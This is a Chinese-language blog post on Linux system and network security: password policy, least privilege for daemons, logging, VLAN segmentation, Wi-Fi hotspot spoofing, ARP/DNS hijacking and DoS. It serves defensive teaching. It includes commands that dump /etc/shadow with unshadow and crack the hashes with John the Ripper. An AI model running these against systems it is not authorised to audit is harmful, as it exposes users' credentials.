@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
+  <link rel="mask-icon" href="/favicon.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.lichao.xin","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"3ZZ8ITB7HE","apiKey":"062eb5a54afbcbf3f20452d58fc40035","indexName":"xinlc","hits":{"per_page":10},"labels":{"input_placeholder":"搜索","hits_empty":"未发现与「${query}」相关的内容","hits_stats":"${hits} 条相关条目，使用了 ${time} 毫秒"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="在开发一个应用的过程中，需要涉及代码、操作系统、网络和数据库等多个方面。所以，只是了解代码安全肯定是不够的，我们还需要了解常见的基础环境和工具中的安全机制，学会通过正确地配置这些安全机制，来提升安全保障。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux 系统和应用安全">
+<meta property="og:url" content="https://blog.lichao.xin/back-end/security/security-linux/index.html">
+<meta property="og:site_name" content="Richard Xin&#39;s Blog">
+<meta property="og:description" content="在开发一个应用的过程中，需要涉及代码、操作系统、网络和数据库等多个方面。所以，只是了解代码安全肯定是不够的，我们还需要了解常见的基础环境和工具中的安全机制，学会通过正确地配置这些安全机制，来提升安全保障。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/1.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/2.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/3.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/4.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/5.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/6.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/7.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/8.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/9.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/10.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/11.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/12.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/13.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/14.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/15.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/16.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/17.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/18.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/19.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/20.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/21.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/22.jpg">
+<meta property="og:image" content="https://blog.lichao.xin/images/security/security-linux/23.jpg">
+<meta property="article:published_time" content="2020-07-13T20:00:00.000Z">
+<meta property="article:modified_time" content="2021-06-14T01:33:22.399Z">
+<meta property="article:author" content="Richard">
+<meta property="article:tag" content="security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.lichao.xin/images/security/security-linux/1.jpg">
+
+<link rel="canonical" href="https://blog.lichao.xin/back-end/security/security-linux/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Linux 系统和应用安全 | Richard Xin's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?4530ac9d0bc4e258535c4a9b17029f0c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Richard Xin's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Richard Xin's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Quick notes</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">132</span></a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">59</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.lichao.xin/back-end/security/security-linux/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/18113256?v=3&s=460">
+      <meta itemprop="name" content="Richard">
+      <meta itemprop="description" content="惶者生存，偏执者成功">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Richard Xin's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux 系统和应用安全
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-13 20:00:00" itemprop="dateCreated datePublished" datetime="2020-07-13T20:00:00+00:00">2020-07-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-14 01:33:22" itemprop="dateModified" datetime="2021-06-14T01:33:22+00:00">2021-06-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>在开发一个应用的过程中，需要涉及代码、操作系统、网络和数据库等多个方面。所以，只是了解代码安全肯定是不够的，我们还需要了解常见的基础环境和工具中的安全机制，学会通过正确地配置这些安全机制，来提升安全保障。</p>
+<a id="more"></a>
+
+<h2 id="Linux-系统安全"><a href="#Linux-系统安全" class="headerlink" title="Linux 系统安全"></a>Linux 系统安全</h2><p>谈到 Linux，我相信你每天都在使用 Linux 进行各种开发和运维操作。但是，大多数情况下，公司不会给每一个员工分配专有的 Linux 服务器，而是多个开发和运维共用一台 Linux 服务器。那么，其他员工在使用 Linux 服务器的时候，会不会对我们自己的数据和进程产生影响呢？另外，我在 Web 安全中讲过，黑客可以通过很多漏洞控制 Linux 服务器，那我们又该如何避免和控制黑客的破坏呢？</p>
+<h3 id="如何理解-Linux-中的安全模型？"><a href="#如何理解-Linux-中的安全模型？" class="headerlink" title="如何理解 Linux 中的安全模型？"></a>如何理解 Linux 中的安全模型？</h3><p>我们先来看一下 Linux 的构成，Linux 可以分为内核层和用户层。用户层通过内核层提供的操作接口来执行各类任务。</p>
+<p>内核层提供的权限划分、进程隔离和内存保护的安全功能，是用户层的安全基础。一旦内核安全被突破（比如黑客能够修改内核逻辑），黑客就可以任意地变更权限、操作进程和获取内存了。这个时候，任何用户层的安全措施都是没有意义的。</p>
+<p>既然 Linux 的内核安全这么重要，那我们是不是要在防护上付出大量的精力呢？事实上，正如我们不需要在开发应用时（尤其是使用 Java 这类相对高层的语言时），过多地关心操作系统相关的内容一样，我们在考虑 Linux 安全时，也不需要过多地考虑内核的安全，更多的是要考虑用户层的安全。所以，对于 Linux 内核层的安全，我们只需要按照插件漏洞的防护方法，确保使用官方的镜像并保持更新就足够了。</p>
+<p>既然，使用最多的是用户层，那我们就来看一下，用户层的操作都有什么。</p>
+<p>在 Linux 中，用户层的所有操作，都可以抽象为“主体 -&gt; 请求 -&gt; 客体”这么一个流程。比如，“打开 /etc/passwd”这一操作的主体是实际的用户，请求是读，客体是 /etc/passwd 这个文件。</p>
+<p><img src="/images/security/security-linux/1.jpg" alt="1"></p>
+<p>在这个过程中，Linux 内核安全提供了基于权限的访问控制，确保数据不被其他操作获取。Linux 用户层则需要确保权限的正确配置，这也是如何保证多人安全地共用服务器的关键。</p>
+<h3 id="黄金法则是如何在-Linux-系统中应用的？"><a href="#黄金法则是如何在-Linux-系统中应用的？" class="headerlink" title="黄金法则是如何在 Linux 系统中应用的？"></a>黄金法则是如何在 Linux 系统中应用的？</h3><p>现在我们知道了，Linux 系统安全防护的核心是正确配置用户层权限。那接下来，我们就从黄金法则的认证、授权和审计这三个方面来看一下，<br>Linux 系统是如何进行权限配置的，这其中，又有哪些值得我们重点关注的安全选项。</p>
+<h4 id="Linux-中的认证机制"><a href="#Linux-中的认证机制" class="headerlink" title="Linux 中的认证机制"></a>Linux 中的认证机制</h4><p>Linux 系统是一个支持多用户的操作系统，它通过普通的文本文件来保存和管理用户信息。这其中，有两个比较关键的文件：/etc/passwd和/etc/shadow。</p>
+<p>我们知道，在 Linux 中，/etc/passwd是全局可读的，不具备保密性。因此，/etc/passwd不会直接存储密码，而是用 x 来进行占位。那实际的用户密码信息，就会存储到仅 ROOT 可读的/etc/shadow中。</p>
+<p>在/etc/shadow中，除了加密后的密码，也保存了诸如密码有效天数、失效多少天告警之类的密码管理策略。我们可以通过 Chage 命令来对密码管理策略进行修改，比如，通过下面的 Chage 命令，就可以强制 Test 用户在 60 天内必须对密码进行修改。通过这样的方式，就可以降低密码泄露的可能性了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chage -M 60 <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p>因为认证这个功能是由 Linux 内核来提供的，所以在用户层，我们需要关心的安全问题，就是弱密码导致的身份信息泄露。为了解决这个问题，在/etc/shadow中，我们可以制定适当的密码策略。除此之外，我们也可以通过John the Ripper，使用已知的弱密码库，来对 Linux 中的弱密码进行检测。下面的命令，就是使用 John the Ripper 检测弱密码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unshadow /etc/passwd /etc/shadow &gt; mypasswd</span><br><span class="line">john mypasswd</span><br><span class="line">john --show mypassw</span><br></pre></td></tr></table></figure>
+
+<h4 id="Linux-中的授权机制"><a href="#Linux-中的授权机制" class="headerlink" title="Linux 中的授权机制"></a>Linux 中的授权机制</h4><p>在“黄金法则”中，认证只是第一步，它提供了一个可信的身份标识。有了这个身份标识之后，就需要通过授权来限制用户能够发起的请求了。</p>
+<p>在 Linux 中，客体只有文件和目录两种，针对这两种类型的客体，Linux 都定义了读、写和执行这三种权限。你可以通过我总结的这张对比表格看<br>到，文件和目录在这三种权限上的区别。</p>
+<p><img src="/images/security/security-linux/2.jpg" alt="2"></p>
+<p>除此之外，Linux 还提供了一些额外的权限标签，来进行更细粒度地权限控制。</p>
+<p>比如，Linux 提供了文件属性的概念，来对文件设置更多的保护。通过chattr +i /etc/passwd可以防止文件被任何用户修改。</p>
+<p>Linux 还提供了“粘滞位”的功能，主要用来防止用户随意操作其他用户的文件。比如chmod +t /tmp可以阻止删除 /tmp 目录下其他用户的文件。</p>
+<p>这些都是 Linux 在授权中的自我保护机制，那我们能在这个过程中进行怎样的防护呢？</p>
+<p>前面，我们一直在强调，Linux 系统面临的安全威胁其实就是权限问题。也就是说，要么就是敏感文件的权限配置不当，导致这些文件可以被额外的用户访问或执行；要么就是应用存在漏洞或密码泄露，导致低权限用户可以获得更高的权限。</p>
+<p><strong>要解决权限问题，我们就要实践最小权限原则。</strong></p>
+<p>我们先来看一个 Linux 系统安全中最普遍的问题：滥用 ROOT。很多人在登录 Linux 系统后，第一个命令就是通过 su 来获取 ROOT 的 Shell 环境，这样我们就不需要在每次操作的时候，通过 sudo 来临时提升至 ROOT 权限。</p>
+<p>但是，这里你需要注意一点，在 ROOT 的 Shell 环境中启动的所有进程也都具备 ROOT 权限。如果启动的是一个立即返回的进程，如 CAT，不会有太多问题，但如果是一个长期运行的进程，就很容易产生权限的滥用。</p>
+<p>比如，当你以 ROOT 的身份启动 Redis 或者 MySQL 等存储工具时，如果这时有其他用户连入 Redis 或者 MySQL，那他们也能间接地获取 ROOT 的权限。在大部分服务器入侵的场景中，黑客都是通过这些具备 ROOT 权限的进程漏洞，来实现权限提升的。</p>
+<p>因此，在运行任何长驻进程时，我们都需要谨记“最小权限”原则。也就是说，我们可以根据要执行的操作等级，配置“最小权限”来启动常驻进程。比如，如果只是在 Redis 和 MySQL 这样的数据库中进行文件读写操作，根本不需要 ROOT 这种最高等级的权限。</p>
+<p>因此，“最小权限”原则在 Linux 系统中的应用是非常重要的。那你可能会问了，Linux 系统中的操作那么多，每个操作都需要自己进行权限配置吗？当然不是，我们常常会使用一些已知的工具，来实现“最小权限”启动长驻进程的功能，而你需要做的，就是正确地启动或者配置这些工具。</p>
+<p>比如说，我们可以通过 mysqld 启动 MySQL 服务，mysqld 会将 MySQL 的进程分配到“mysql”这个用户，并在 ROOT 下建立守护进程。具体的效果如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root     297353  0.0  0.0 115432  1360 ?        S    Aug12   0:00 /bin/sh /usr/<span class="built_in">local</span>/mysql/bin/mysqld_safe --datadir=/var/lib/mysql --pid-file=/var/lib/mysql/mysql.pid</span><br><span class="line">mysql    297553 31.3  4.3 11282756 5729572 ?    Sl   Aug12 22593:40 /usr/<span class="built_in">local</span>/mysql/bin/mysqld --basedir=/usr</span><br></pre></td></tr></table></figure>
+
+<p>类似的，当启动 Nginx 时，Nginx 会将 Worker 节点以 nobody 的用户身份来执行。具体的效果如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root       7083  0.0  0.0  61032  5324 ?        Ss   Aug12   0:01 nginx: master process nginx</span><br><span class="line">nobody   331122  0.0  0.0  90768 31776 ?        S    11:44   0:00 nginx: worker process</span><br><span class="line">nobody   331123  0.0  0.0  90768 32720 ?        S    11:44   0:00 nginx: worker process</span><br><span class="line">nobody   331124  0.0  0.0  90768 31776 ?        S    11:44   0:00 nginx: worker process</span><br></pre></td></tr></table></figure>
+
+<p>当然，也有一些工具不提供这类最小权限切换的功能，比如，在直接执行redis-server启动 Redis 的时候，就需要我们自己来对用户身份进行切换。那用户身份切换怎么做呢？</p>
+<p>我们首先来看 Nginx 的例子，在启动 Nginx 的时候，Linux 提供了 nobody 这么一个用户的身份。实际上，任何人进入 Linux 系统首先获得的用户身份就是 nobody，然后再从 nobody 进行登录，切换到其他正常用户身份上。</p>
+<p>因此，nobody 通常拥有整个操作系统中最小的权限。所以，对于不提供最小权限切换功能的工具，我们就可以使用 nobody 的用户身份，来进行主动切换了。</p>
+<p>在执行redis-server启动 Redis 的时候，我们就可以通过以下命令，以 nobody 的身份执行redis-server了（前提是，我们需要对日志和 PID 等目录进行适当配置，确保能够以 nobody 身份写入）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -s /bin/redis-server nobody</span><br></pre></td></tr></table></figure>
+
+<p>这样一来，我们就能通过“最小权限”原则，提升 Linux 系统授权的安全性了。</p>
+<h4 id="Linux-中的审计机制"><a href="#Linux-中的审计机制" class="headerlink" title="Linux 中的审计机制"></a>Linux 中的审计机制</h4><p>在 Linux 系统中，系统的日志信息通常存储在 /var/log 目录下，部分应用程序也会把相关日志记录到这个目录中。系统日志主要分为 3 类，用户登录日志、特殊事件日志和进程日志。</p>
+<p>用户登录日志主要是/var/log/wtmp和/var/run/utmp，用来保存用户登录相关的信息。用户登录日志本身为二进制文件，我们无法直接通过文本方式查看，但是可以配合who/users/ac/last/lastlog这样的命令来获取。</p>
+<p>特殊事件日志主要包括/var/log/secure和/var/log/message。其中，/var/log/secure主要记录认证和授权相关的记录，如果有人试图爆破 SSH，我们就可以从这个日志中观察出来。/var/log/message由 syslogd 来维护，syslogd 这个守护进程提供了一个记录特殊事件和消息的标准机制，其他应用可以通过这个守护进程来报告特殊的事件。</p>
+<p>进程日志：当通过 accton 来进行系统进程管理时，会生成记录用户执行命令的 pacct 文件。</p>
+<p>默认情况下，Linux 会通过 logrotate 对日志执行相应的保留策略（比如日志切割和旧日志删除等）。通过配置/etc/logrotate.conf可以对不同日志的保留策略进行修改。</p>
+<p>那如何对日志进行监控呢？这里，我向你推荐 2 种常见的日志分析工具 ELK 和 Zabbix，你可以利用这些工具来监控 Linux 的安全日志。也就是说，我们可以通过在这些分析平台配置恰当的规则（如 SSH 登录尝试失败 3 次以上），来及时发现黑客的部分入侵尝试，迅速产生报警。然后，我们就可以针对具体的问题，进行人工复查了。</p>
+<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><p>你平时使用手机连接无线网络的时候，一定看到过这样的安全提示：不要连接陌生的 Wi-Fi。也一定看过很多这样的报道：某先生 / 女士因为使用了陌生的 Wi-Fi，信息遭到泄露，不仅账号被盗用，还造成了经济损失。</p>
+<p>你可能要说了，只要我避免连入陌生的 Wi-Fi，前面说的攻击就基本不会发生了。但是，在工作中，员工和服务器通常接入的也是同一个网络，那员工是不是就可以任意地捕获服务器中的流量呢？其他人是不是也能轻易地窃取员工信息呢？内网又是怎么保证安全性的呢？</p>
+<h3 id="内网中的“最小权限原则”"><a href="#内网中的“最小权限原则”" class="headerlink" title="内网中的“最小权限原则”"></a>内网中的“最小权限原则”</h3><p>我们先来看，内网是怎么保证安全性的。前面我们说过，在 Linux 系统中，我们可以使用“最小权限原则”来限制黑客的行动能力。而“最小权限原则”，在内网中同样适用。为了保证安全性，我们要限制黑客进入内网后的权限范围，也就是说，就算黑客能够进入内网，我们也只允许它在一个有限的子网内进行访问，而不能任意地访问所有服务。那内网中的“最小权限原则”究竟是怎么实现的呢？</p>
+<p>在内网中，实现“最小权限原则”的核心在于分区和隔离。接下来，我们就一起来看，在公司内网中，分区和隔离具体是怎么实现的。</p>
+<h4 id="对内网进行水平划分"><a href="#对内网进行水平划分" class="headerlink" title="对内网进行水平划分"></a>对内网进行水平划分</h4><p>我们知道，连入内网的人和设备具备不同的“身份”和“权限”。比如，公司正式员工、外包员工和访客等，这些人所使用的内网服务区别很大。因此，我们需要依据不同的“身份”来对网络区域进行隔离，而这就需要用到 VLAN 提供的功能了。</p>
+<p>那什么是 VLAN 呢？在一般情况下，连入同一个交换机的所有设备都在同一个网络中，两两之间能够相互访问。为了阻止这些设备相互访问，我们可以在交换机上设定，在不改变物理连接的情况下，通过交换机的控制将这个网络划分为多个不同的子网，也就是 VLAN（ Virtual Local Area Network，虚拟局域网）。简单来说，VLAN 就是一个交换机创建出来的多个子网。因为隔离的存在，不同 VLAN 的访问请求，会被交换机阻止。</p>
+<p>这样一来，我们就实现了对不同“身份”的人的网络隔离。</p>
+<h4 id="对内网进行垂直划分"><a href="#对内网进行垂直划分" class="headerlink" title="对内网进行垂直划分"></a>对内网进行垂直划分</h4><p>事实上，对不同“身份”的人的网络隔离属于对内网进行水平划分。除此之外，公司也会对内网进行垂直划分。</p>
+<p>最简单的，我们会将公司内网整体保护起来，和外网进行隔离，这种隔离就属于垂直划分。在这种隔离之下，内网可以访问外网的资源，外网却不能够直接访问内网的资源。要实现这种隔离，就需要用到路由器了。路由器会将连入的所有内网设备打包在一起。所以，对外网来说，内网变成了一个整体，也就无法访问到某个具体的设备了。</p>
+<p>在下图中，我简单地展示了一下利用路由器和交换机对内网进行划分的效果：通过路由器划分内网和外网，通过交换机划分正式员工网络和外包员工网络。实际上，你还可以对每一个 VLAN 按照安全等级，进行进一步的垂直和水平划分。</p>
+<p><img src="/images/security/security-linux/3.jpg" alt="3"></p>
+<h3 id="有线网络和无线网络安全"><a href="#有线网络和无线网络安全" class="headerlink" title="有线网络和无线网络安全"></a>有线网络和无线网络安全</h3><p>现在，你应该知道如何在内网中落实“最小权限原则”了。而网络作为一个数据传输的主要通道，保障其中数据的安全性，也是非常重要的。这其中包括两个关键问题。</p>
+<ul>
+<li>如何保障通道中的数据不被窃取？这涉及认证和加密的手段。</li>
+<li>如何保障通道的接收方是可信的？也就是如何避免被“劫持”。</li>
+</ul>
+<p>在工作中，我们最常接触的两种网络就是有线和无线网络，接下来，我就结合前面这两个关键问题，带你探讨一下有线和无线环境中的网络安全。</p>
+<h4 id="无线网络安全"><a href="#无线网络安全" class="headerlink" title="无线网络安全"></a>无线网络安全</h4><p>无线网络你应该非常熟悉，我们在实际工作和生活中到处都需要用到无线网络。在无线网中，个人设备是通过射频技术和无线热点进行连接的。射频无法定向接收，因此，数据都是“广播”出去的。也就是说，只要在设备和热点附近，任何人都能接收到无线网络中的数据。</p>
+<p>为了保证无线网络数据的安全性，我们主要的防护手段，就是使用目前最安全的无线网络协议WPA2。</p>
+<p>但是，WPA2 协议只是用来保护无线网络中数据安全性的。它的连入密钥都是共享的，所以不具备严格意义上的认证功能。而公司需要通过认证知道每一个连入内网的设备的归属，来追踪每一个员工的操作。那无线网络中的认证是怎么做的呢？</p>
+<p>一般的操作是对连入的用户实行“强制门户”。“强制门户”你应该很熟悉，就是当你使用公用密钥连入网络之后，还需要你在网页中再次进行认证。比如，在连入机场网络后，还需要你进行手机号验证。具体的原理就是，用户在连入 Wi-Fi 后，路由器会将用户的 HTTP 请求重定向至认证页面。认证成功后，路由器会记录用户的身份和 MAC，后续路由器就可以根据 MAC 来识别用户身份了。</p>
+<p><img src="/images/security/security-linux/4.jpg" alt="4"></p>
+<p>那“强制门户”在公司内部是怎么应用的呢？一般在连入内网后，员工还需要通过公司邮箱和密码，进行一次额外的验证。这样一来，公司就能够知道连入内网的到底是哪一名员工了。</p>
+<p>说完了无线网络中的认证和加密，我们再看一下“劫持”的问题。在无线网络中，“劫持”的主要方式是，伪造热点。</p>
+<p>伪造热点的实现，主要依赖的就是现在设备的自动连网功能。简单来说，就是只要你的设备曾经连入过某一个热点，设备就会记住这个热点的 ID 和密码，下次如果设备再检测到这个热点 ID，就会尝试自动连接。</p>
+<p>而黑客也可以利用自动连网的功能发起攻击。黑客只需要伪造出来一个相同的热点 ID，就可以诱导用户的设备连入黑客的热点，从而“劫持”流量。避免伪造热点的方法也很简单，就是对办公网络中的未知热点进行扫描。</p>
+<p>所以，总结一下，在无线网的安全中，我们需要关注这三个点：</p>
+<ul>
+<li>是否使用了安全的协议，也就是 WPA2；</li>
+<li>是否有认证技术，也就是强制门户；</li>
+<li>是否有未知的热点出现在办公环境中。</li>
+</ul>
+<h4 id="有线网络安全"><a href="#有线网络安全" class="headerlink" title="有线网络安全"></a>有线网络安全</h4><p>区别于无线网络，有线网络不存在认证和加密的问题。这个很好理解，因为有线网是通过网线来进行物理接入的。换一句话说，只要运维人员给服务器插上了网线，就说明运维人员授权这台服务器接入内网了。而且，一根网线只能将一台设备连入网络，不存在网线共享。所以，不需要考虑加密的问题。因此，我们在有线网络中，主要考虑的问题就是“劫持”。</p>
+<p>所谓“劫持”，其实就是误导服务器将请求发送到黑客的设备上去。在无线网中，服务器实际上是向连接的热点发送请求，因此，我们可以通过伪造热点来进行误导。那在有线网中，服务器又会向哪里发送请求呢？</p>
+<p>在网络协议中，目标地址主要通过 MAC 地址和 IP 地址来确定。MAC 地址和 IP 地址分别是基于ARP 协议和DNS 协议来进行寻址的。因为 ARP 和 DNS 都是早期的网络协议，所以安全性较低。因此黑客可以轻易地发出伪造的 ARP 包和 DNS 包，从而“欺骗”目标设备将数据包发送到黑客的设备上，实现流量“劫持”的功能。</p>
+<p>为了帮助你理解这个过程，我把 ARP“劫持”的过程总结成了一张图。从这张图中，我们能看到，服务器 A 想要向服务器 B 发起请求，但是黑客通过发送伪造的 ARP 包误导 A 说：“10.0.0.2 的 MAC 地址是 3:3:3:3”。因为 ARP 没有进行认证，所以 A 会无条件相信黑客的说法。那么，当 A 想要向 B 发送请求的时候，MAC 地址会设定成黑客的 3:3:3:3，所以请求最终就发送到了黑客的服务器上。DNS“劫持”的原理，和这个比较类似，也是黑客误导服务器，让服务器错认黑客的 IP 为某个域名的 IP。</p>
+<p><img src="/images/security/security-linux/5.jpg" alt="5"></p>
+<h3 id="如何理解-DDoS-攻击？"><a href="#如何理解-DDoS-攻击？" class="headerlink" title="如何理解 DDoS 攻击？"></a>如何理解 DDoS 攻击？</h3><p>最后，我们再来介绍一种常见的内网攻击，DDoS 攻击（Distributed Denial Of Service Attack，分布式拒绝服务攻击）。DDoS 就是黑客由外网向公司服务发起大量的请求，从而打满网络带宽，让内网无法响应用户的正常请求。那么，DDoS 是如何产生的呢？我们又该如何防护呢？</p>
+<p>说到这，我们先了解一下 DoS（Denail f Service，拒绝服务）攻击。知道了 DoS 攻击，DDoS 攻击就很好理解了。</p>
+<p>DoS 攻击主要有两种类型。一种是通过漏洞进行攻击，使得服务或设备因为程序报错而宕机。比如针对 ICMP 协议的“死亡之 PING”，就是因为旧版本的 Windows 系统在处理超长的 ICMP 包时会报错死机。另一种则是通过巨量的垃圾流量挤占网络带宽，使得网络设备无法接收或者发送合法的流量。</p>
